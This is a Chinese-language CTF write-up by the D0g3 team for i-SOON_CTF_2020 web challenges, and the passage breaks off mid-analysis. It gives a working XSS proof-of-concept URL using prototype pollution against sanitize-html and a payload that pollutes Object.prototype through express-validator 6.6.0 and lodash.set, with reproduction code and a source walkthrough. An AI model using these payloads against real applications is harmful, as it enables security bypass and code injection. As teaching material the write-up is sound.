本文由 [@D0g3](https://www.d0g3.cn/about) 编写
i-SOON_CTF_2020 部分题目环境/源码后续将在Github开源  
[项目地址](https://github.com/D0g3-Lab/)
# Web
## XSS
#### 预期
poc:
    http://47.108.162.43:3000/?data={"__proto__":{"innerText":"//"},"text":""}
santinize-html第16879行，text与frame.innerText整合为result，作为return的结果
    if (options.selfClosing.indexOf(name) !== -1) {
        result += " />"
    } else {
        result += ">";
        if (frame.innerText && !hasText && !options.textFilter) {
            result += frame.innerText;
            addedText = true
        }
    }
只要是任意白名单标签都可以在其后加入任意内容  
#### 非预期
`ddddhm`队伍师傅用jq的非预期  
jquery在init的时候会自动进行一次paseHTML(即使没有调用任何方法)。jquery yyds  
## Validator
#### 题目信息
题目考点：
  1. Nodejs代码审计
  2. 原型链污染分析
解题思路：
  * 获取源码  
由于express-static配置错误，导致可以任意查看静态文件  
直接访问获取源码与环境：  
/app.js  
/package.json
  * validator原型链污染漏洞
出题的思路来自于XNUCA2020的一道原型链污染题，原题的正解是污染原型链value值为空，但是0ops的师傅在解题的过程中做到了任意原型链污染，这题就是以这个任意原型链污染为基础的。(师傅们在做题的时候应该是可以直接搜到这个payload的)  
参考原比赛的wp：[oooooooldjs](https://github.com/NeSE-Team/XNUCA2020Qualifier/tree/main/Web/oooooooldjs)
针对任意原型链污染这个点，深入的分析在后面。
题目部分源码：
    if (req.body.password == "D0g3_Yes!!!"){
            console.log(info.system_open)
            if (info.system_open == "yes"){
                const flag = readFile("/flag")
                return res.status(200).send(flag)
            }else{
                return res.status(400).send("The login is successful, but the system is under test and not open...")
            }
        }else{
            return res.status(400).send("Login Fail, Password Wrong!")
        }
这里只有一个简单的info.system_open的判断，所以我们只需要构造出能够污染info.system_open的payload即可。  
最终构造出的payload如下：
    {"password":"D0g3_Yes!!!", "a": {"__proto__": {"system_open": "yes"}}, "a\"].__proto__[\"system_open": "yes" }
#### express-validator 6.6.0 原型链污染详细分析
##### 测试用例
测试例子:
    const express = require('express')
    const app = express()
    const port = 9000
    app.use(express.json())
    app.use(express.urlencoded({
        extended: true
    }))
    const {
        body,
        validationResult
    } = require('express-validator')
    middlewares = [
        body('*').trim() // 对所以键值进行trim处理
    ]
    app.use(middlewares)
    app.post("/user", (req, res) => {
        const foo = "hellowrold"
        return res.status(200).send(foo)
    })
    app.listen(port, () => {
        console.log(`server listening on ${port}`)
    })
依赖包版本：
    npm init
    npm install PI:EMAIL
    npm install express-validator@6.6.0
    npm install express
express-validator参考：
在分析这个原型链污染漏洞之前，我们先对express-validator的过滤器(sanitizer)的实现流程进行一个分析。
##### 过滤器(sanitizer)实现流程
在src/middlewares/validation-chain-builders.js文件中找到body的实现
传递到了check_1.check方法中，跟入check.js文件
location传递进来后传递到setLocations方法里创建了一个builder对象，并传入到chain_1.SanitizersImpl方法中。对于return，在题目的Wirteup中有以下的描述：
> 先看return的地方，check函数里的middleware就是express-> validator最终对接express的中间件。utils_1.bindAll函数做的事情就是把对象原型链上的函数绑定成了对象的一个属性，因为Object.assign只做浅拷贝，utils.bindAll之后Object.assign就可以把sanitizers和validators上面的方法都拷贝到middleware上面了，这样就能通过这个middleware调用所有的验证和过滤函数。
针对bindAll，我个人的理解是：bindAll函数就是把需要调用的方法都绑定到middleware上进而实现链式调用。
  * 什么是链式调用：
  * bindAll方法: 
传入bindAll的参数值是通过Chain_1.SanitizersImpl返回的，可以通过chain.js确定到这个函数的定义位置为src/chain/sanitizers-impl.js。
在这个类中存在很多的过滤器(sanitizer)，过滤器实现的方法都调用了this.addStandardSanitization()将过滤器传入到sanitization_1.Sanitization()方法中，得到的结果最终传递给this.builder.addItem()。
先来看sanitization_1.Sanitization()方法，位置在：src/context-items/sanitization.js：
这个Sanitization类中的run方法最终通过调用sanitizer方法设置了context的值。(context后面的处理过程在漏洞分析部分)
再来看this.builder.addItem()做了什么，位置在src/context-builder.js
就是把传入进来的值压入this.stack栈中。
回到Sanitization类中的run方法，这个run方法是在哪调用的呢？再看到check.js，这里创建了一个runner对象，并在middleware里调用了run方法：
同样可以从chain/index.js中找到实现runner.run方法的具体位置为：
这里可以看到是从context.stack里面循环遍历了contextItem，并调用了其run方法。在这条循环语句处下断点查看一下context的内容：
在stack里面就是包含了我们所调用的过滤器，而这个context.stack也就是this.builder.addItem()所设置的值。
这就是完整的express-validator的过滤器(sanitizer)的实现流程，wp中对这个过程有一个总结：
> express-> validator的做法是把各种validator和sanitizers的方法绑定到check函数返回的middleware上，这些validator和sanitizer的方法通过往context.stack属性里面push
> context-items，最终在ContextRunnerImpl.run()方法里遍历context.stack上面的context-> items，逐一调用run方法实现validation或者是sanitization
我这里画了一个流程图来梳理这一过程：
(这个流程图画的比较复杂，如果你尝试跟过一遍的话再来看这个流程图就会比较容易理解一些
##### lodash 
    lod = require('lodash')
    lod.setWith({}, "__proto__[test]", "123")
    lod.set({}, "__proto__[test2]", "456")
    console.log(Object.prototype)
##### express-validator中lodash原型链污染漏洞攻击面
在题目环境中`npm install`的时候就会有提示，express-validator库中的所依赖的lodash库存在原型链污染漏洞。
这是因为express-validator的依赖包中，lodash的安装版本最低为4.17.15的，所以在一定条件下会存在原型链污染漏洞。(这里的测试环境我们安装的是4.17.16版本，lodash在4.17.17以下存在原型链污染漏洞)
继续分析：
跟着上面过滤器(sanitizer)实现流程的最后几步，runner.run方法在context.stack里面循环遍历了contextItem，并调用了其run方法。
我们先来看看这个值的传入过程是怎么样的。
##### 请求中值的传入过程
测试数据包：
    {"__proto__[test]": "123 "}
在调用run方法时传入了一个instance.value的变量，这个变量的值是我们传入json数据当中的值，run方法在调用过滤器处理后给其赋予了一个新的值。  
我们下断点来查看一下：
经过过滤器处理后(也就是经过了一个`trim()`处理)：
可以看到，newvalue是instance.value经过run方法处理后得到的值，一直往上推可以得知instance的实现方法是this.selectFields，位置是在select-fields.js文件中：
select-fields.js:  
这个文件的处理过程中我们需要了解到的就是在segments.reduce函数中对输入的值进行了一些判断和替换。重要的点就是当传入的键中存在`.`
，则会在字符两边加上`[" "]`，并且最终返回的是一个字符串形式的结果。(对于这些语句更为详细的原因可以参考writeup中对这一段的描述)
接着之前的过程，在经过了过滤器的处理之后，会通过lodash.set对指定的path设置新值，也就是如图中的`_.set(req[location],
path, newValue)`过程。
现在可以尝试一下能不能通过lodash.set原型链污染来污染指定的值：
尝试污染 **proto** [test]，结果发现是污染并没有成功：
原因是因为，当lodash.set中第一个参数存在一个与第二个参数同名的键时，污染就会失败，测试如下：